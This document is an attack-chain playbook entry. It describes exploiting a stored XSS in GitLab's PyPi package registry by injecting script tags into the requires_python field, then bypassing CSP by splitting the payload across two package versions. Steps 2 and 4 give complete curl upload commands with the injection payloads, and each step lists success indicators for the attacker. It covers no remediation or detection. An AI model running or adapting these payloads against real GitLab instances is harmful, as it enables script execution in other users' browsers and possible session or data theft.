---
id: ac-gitlab-pypi-xss-856836
tags:
  - xss
  - stored-xss
  - gitlab
  - pypi
  - csp-bypass
type: attack_chain
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
verified: false
platforms:
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Create-GitLab-Project]]'
  - '[[procedures/Upload-Malicious-PyPi-Package]]'
  - '[[procedures/Trigger-Stored-XSS-Endpoint]]'
  - '[[procedures/Upload-Multi-Version-Packages-for-CSP-Bypass]]'
  - '[[procedures/Trigger-CSP-Bypass-XSS]]'
step_count: 5
techniques:
  - '[[JavaScript]]'
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-13T23:52:20.974Z'
description: >-
  Multi-stage exploitation of stored XSS in GitLab's PyPi package registry by
  injecting payloads into the requires_python field, including a CSP bypass
  using multiple package versions.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Drive-by Compromise]]'
---
# Stored XSS in GitLab PyPi via Unsanitized requires_python Field

Multi-stage attack chain exploiting a stored XSS vulnerability in GitLab's PyPi package feature. The requires_python field is not sanitized before insertion into HTML attributes on the simple API endpoint, allowing arbitrary JavaScript execution. Initially blocked by CSP, the attack bypasses it by splitting payloads across multiple package versions to load external scripts.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 5 |
| Execution Time | ~10 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Project Setup] --> B[Upload Malicious Package]
    B --> C[Trigger Basic XSS]
    C --> D[Upload Multi-Version Bypass]
    D --> E[Trigger CSP Bypass XSS]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#f39c12
    style D fill:#3498db
    style E fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/curl]]

### Target Environment

- GitLab instance with PyPi package registry enabled
- Required services/ports: HTTPS (443)
- Network access requirements: Authenticated access to GitLab API

### Initial Access Requirements

- Valid GitLab personal access token with API write permissions
- Network position: Direct access to GitLab instance
- Prior access needed: None, but project creation requires authentication

## Detailed Attack Procedures

### Step 1: Project Creation
procedure: [[procedures/Create-GitLab-Project]]

**Objective**: Establish a GitLab project to host the PyPi package registry.

**Instructions**: Use the GitLab UI or API to create a new project. No specific command is required beyond standard creation; ensure the project ID is noted (e.g., 18315917 from example).

**Expected Output**: New project created with an assigned ID.

**Success Indicators**:
- Project visible in GitLab dashboard
- API endpoint for packages accessible

### Step 2: Upload Malicious PyPi Package
procedure: [[procedures/Upload-Malicious-PyPi-Package]]

**Objective**: Upload a PyPi package with a malicious payload in the requires_python field to store the XSS.

**Instructions**: Prepare a dummy package file (e.g., /tmp/lala.txt) and use [[commands/upload-pypi-package-xss]] to upload via the API:

```bash
curl -v "https://__token__:$TOKEN@gitlab.com/api/v4/projects/18315917/packages/pypi" -F content=@/tmp/lala.txt -F requires_python=2.7 -F version=1 -F name='package_test_1' -F requires_python='"><script>alert(1)</script>'
```

Replace $TOKEN with your personal access token and project ID as needed.

**Expected Output**: HTTP 200/201 response indicating successful upload.

**Success Indicators**:
- Package listed in project packages
- Payload stored without errors

### Step 3: Trigger Stored XSS
procedure: [[procedures/Trigger-Stored-XSS-Endpoint]]

**Objective**: Visit the simple API endpoint to execute the injected JavaScript payload.

**Instructions**: Navigate to the endpoint URL in a browser: https://gitlab.com/api/v4/projects/18315917/packages/pypi/simple/package_test_1. The unsanitized requires_python injects into a data attribute, e.g., <a href="..." data-requires-python=""><script>alert(1)</script>">filename</a>.

**Expected Output**: Alert(1) popup or JavaScript execution (may be blocked by CSP initially).

**Success Indicators**:
- JavaScript alert triggers
- DOM inspection shows injected script

### Step 4: Upload Multi-Version Packages for CSP Bypass
procedure: [[procedures/Upload-Multi-Version-Packages-for-CSP-Bypass]]

**Objective**: Upload two versions of a package with split payloads to concatenate and bypass CSP restrictions.

**Instructions**: First, upload version 1 using [[commands/upload-pypi-version1-bypass]]:

```bash
curl -v "https://__token__:$TOKEN@gitlab.com/api/v4/projects/18315917/packages/pypi" -F content=@/tmp/lala.txt -F requires_python=2.7 -F version=1 -F name='package_csp_bypass' -F requires_python='"><script src=/vakzz-h1/public/-/raw/a/test.js>'
```

Then, upload version 2 using [[commands/upload-pypi-version2-bypass]]:

```bash
curl -v "https://__token__:$TOKEN@gitlab.com/api/v4/projects/18315917/packages/pypi" -F content=@/tmp/lala.txt -F requires_python=2.7 -F version=2 -F name='package_csp_bypass' -F requires_python=' </script>'
```

The endpoint concatenates links from multiple versions, forming a complete <script> tag.

**Expected Output**: Both uploads succeed (HTTP 200/201).

**Success Indicators**:
- Multiple versions visible in package list
- Payloads stored for concatenation

### Step 5: Trigger CSP Bypass XSS
procedure: [[procedures/Trigger-CSP-Bypass-XSS]]

**Objective**: Visit the bypass endpoint to load and execute the external script.

**Instructions**: Navigate to https://gitlab.com/api/v4/projects/18315917/packages/pypi/simple/package_csp_bypass in a browser. The concatenated payload loads test.js from the specified path.

**Expected Output**: External script executes, bypassing CSP.

**Success Indicators**:
- Script from test.js runs
- No CSP violation errors in console

## Attack Chain Summary

### Key Achievements

1. Stored XSS injection via unsanitized requires_python field
2. Demonstration of basic payload execution
3. CSP bypass using multi-version package concatenation to load external JS

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[JavaScript]]
- [[Drive-by Compromise]]

### MITRE ATT&CK Tactics

- [[Execution]]
- [[Collection]]

---
*Last updated: 2023-10-01T00:00:00Z*
